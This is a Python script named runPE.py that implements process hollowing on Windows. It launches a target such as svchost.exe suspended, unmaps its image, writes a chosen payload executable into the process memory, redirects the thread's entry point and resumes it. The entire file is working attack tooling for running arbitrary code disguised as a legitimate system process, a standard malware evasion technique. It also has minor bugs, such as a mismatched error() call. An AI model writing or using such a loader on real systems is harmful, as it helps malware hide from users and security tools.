from ctypes import *
from pefile import PE
import sys

if len(sys.argv) != 3:
        print "Usage: runPE.py Payload.exe Target.exe"
        print "Example: runPE.py HelloWorld.exe C:\windows\system32\svchost.exe"
        sys.exit()

payload_exe = sys.argv[1]
target_exe = sys.argv[2]



class PROCESS_INFORMATION(Structure):
	_fields_ = [
                ('hProcess', c_void_p), 
                ('hThread', c_void_p), 
                ('dwProcessId', c_ulong), 
                ('dwThreadId', c_ulong)]
	
class STARTUPINFO(Structure):
	_fields_ = [
                ('cb', c_ulong), 
                ('lpReserved', c_char_p),    
                ('lpDesktop', c_char_p),
                ('lpTitle', c_char_p),
                ('dwX', c_ulong),
                ('dwY', c_ulong),
                ('dwXSize', c_ulong),
                ('dwYSize', c_ulong),
                ('dwXCountChars', c_ulong),
                ('dwYCountChars', c_ulong),
                ('dwFillAttribute', c_ulong),
                ('dwFlags', c_ulong),
                ('wShowWindow', c_ushort),
                ('cbReserved2', c_ushort),
                ('lpReserved2', c_ulong),    
                ('hStdInput', c_void_p),
                ('hStdOutput', c_void_p),
                ('hStdError', c_void_p)]
	
class FLOATING_SAVE_AREA(Structure):
	_fields_ = [
                ("ControlWord", c_ulong),
                ("StatusWord", c_ulong),
                ("TagWord", c_ulong),
                ("ErrorOffset", c_ulong),
                ("ErrorSelector", c_ulong),
                ("DataOffset", c_ulong),
                ("DataSelector", c_ulong),
                ("RegisterArea", c_ubyte * 80),
                ("Cr0NpxState", c_ulong)]	
	
class CONTEXT(Structure):
        _fields_ = [
                ("ContextFlags", c_ulong),
                ("Dr0", c_ulong),
                ("Dr1", c_ulong),
                ("Dr2", c_ulong),
                ("Dr3", c_ulong),
                ("Dr6", c_ulong),
                ("Dr7", c_ulong),
                ("FloatSave", FLOATING_SAVE_AREA),
                ("SegGs", c_ulong),
                ("SegFs", c_ulong),
                ("SegEs", c_ulong),
                ("SegDs", c_ulong),
                ("Edi", c_ulong),
                ("Esi", c_ulong),
                ("Ebx", c_ulong),
                ("Edx", c_ulong),
                ("Ecx", c_ulong),
                ("Eax", c_ulong),
                ("Ebp", c_ulong),
                ("Eip", c_ulong),
                ("SegCs", c_ulong),
                ("EFlags", c_ulong),
                ("Esp", c_ulong),
                ("SegSs", c_ulong),
                ("ExtendedRegisters", c_ubyte * 80)]

def error():
        print "[!]Error: " + FormatError(GetLastError())
        print "[!]Exiting"
        print "[!]The process may still be running"
        sys.exit()
        

print "[1]Creating Suspended Process"
startupinfo = STARTUPINFO()
startupinfo.cb = sizeof(STARTUPINFO)
processinfo = PROCESS_INFORMATION()

CREATE_SUSPENDED = 0x0004
if windll.kernel32.CreateProcessA(None,
                               target_exe,
                               None,
                               None,
                               False,
                               CREATE_SUSPENDED,
                               None,
                               None,
                               byref(startupinfo),
                               byref(processinfo)) == 0:
       error(GetLastError())
        

hProcess = processinfo.hProcess
hThread = processinfo.hThread

print "\t[+]Successfully created suspended process! PID: " + str(processinfo.dwProcessId)
print
print "[2]Reading Payload PE file"

File = open(payload_exe,"rb")
payload_data = File.read()
File.close()
payload_size = len(payload_data)

print "\t[+]Read the payload data. payload size: " + str(payload_size)
print
print "[3]Extracting the necessary info from the payload data."
payload = PE(data = payload_data)
payload_ImageBase = payload.OPTIONAL_HEADER.ImageBase
payload_SizeOfImage = payload.OPTIONAL_HEADER.SizeOfImage
payload_SizeOfHeaders = payload.OPTIONAL_HEADER.SizeOfHeaders
payload_sections = payload.sections
payload_NumberOfSections = payload.FILE_HEADER.NumberOfSections
payload_AddressOfEntryPoint = payload.OPTIONAL_HEADER.AddressOfEntryPoint
payload.close()

payload_data_pointer = cdll.msvcrt.calloc(
                                c_int(payload_size+1),
                                sizeof(c_char))


memmove(                        payload_data_pointer,
                                payload_data,
                                payload_size)

print "\t[+]Data from the PE Header: "
print "\t[+]Image Base Address: " + str(hex(payload_ImageBase))
print "\t[+]Address of EntryPoint: " + str(hex(payload_AddressOfEntryPoint))
print "\t[+]Size of Image: " + str(payload_SizeOfImage)
print "\t[+]Pointer to data: " + str(hex(payload_data_pointer))

print "[4]Getting Image Base Address from "
target = PE(target_exe)
target_ImageBase = target.OPTIONAL_HEADER.ImageBase
target.close()

print
print "[5]Unmapping"
if not windll.ntdll.NtUnmapViewOfSection(
                                hProcess,
                                target_ImageBase):
        error()

print
print "[6]Allocation memory"

MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

address = windll.kernel32.VirtualAllocEx(
                                hProcess, 
                                c_char_p(payload_ImageBase), 
                                c_int(payload_SizeOfImage), 
                                MEM_COMMIT|MEM_RESERVE, 
                                PAGE_EXECUTE_READWRITE)

if address == 0:
        error()

print "\t[-]Allocated to: "+ str(hex(address))

print
print "[7]Writing Headers"
lpNumberOfBytesWritten = c_size_t(0)

if windll.kernel32.WriteProcessMemory(
                                hProcess,
                                c_char_p(payload_ImageBase),
                                c_char_p(payload_data_pointer),
                                c_int(payload_SizeOfHeaders),
                                byref(lpNumberOfBytesWritten)) == 0:
                error()

print "\t[+]Bytes written:", lpNumberOfBytesWritten.value
print "\t[+]Pointer to data: " + str(hex(payload_ImageBase))
print "\t[+]Writing to: " + str(hex(payload_data_pointer))
print "\t[+]Size of data: " + str(hex(payload_SizeOfHeaders))

print
for i in range(payload_NumberOfSections):
        section = payload_sections[i]
        dst = payload_ImageBase + section.VirtualAddress
        src = payload_data_pointer + section.PointerToRawData
        size = section.SizeOfRawData
        print
        print "[" + str(8 + i) + "]Writing section: " + section.Name
        print "\t[+]Pointer to data: " + str(hex(src))
        print "\t[+]Writing to: " + str(hex(dst))
        print "\t[+]Size of data: " + str(hex(size))

        lpNumberOfBytesWritten  = c_size_t(0)

        if windll.kernel32.WriteProcessMemory(
                                hProcess,
                                c_char_p(dst),
                                c_char_p(src),
                                c_int(size),
                                byref(lpNumberOfBytesWritten)) == 0:
                 error()
                 
        print "\t[+]Bytes written:", lpNumberOfBytesWritten.value
         


cx = CONTEXT()
cx.ContextFlags = 0x10007

print
print "[" + str( 8 + payload_NumberOfSections ) + "]Getting Context"
if windll.kernel32.GetThreadContext(hThread, byref(cx)) == 0:
         error()
        

print
print "[" + str( 9 + payload_NumberOfSections ) + "]Editing Context"
cx.Eax = payload_ImageBase + payload_AddressOfEntryPoint

lpNumberOfBytesWritten  = c_size_t(0)
if windll.kernel32.WriteProcessMemory(
                                hProcess,
                                c_char_p(cx.Ebx+8),
                                c_char_p(payload_data_pointer+0x11C),
                                c_int(4),
                                byref(lpNumberOfBytesWritten)) == 0:
         error()
print "\t[+]Bytes written:", lpNumberOfBytesWritten.value

print 
print "[" + str( 10 + payload_NumberOfSections ) + "]Setting Context"
windll.kernel32.SetThreadContext(
                                hThread,
                                byref(cx))

print
print "[" + str( 11 + payload_NumberOfSections ) + "]Resuming Thread"
if windll.kernel32.ResumeThread(hThread) == 0:
        error()

print
print "[" + str( 12 + payload_NumberOfSections ) + "]Succes"
        
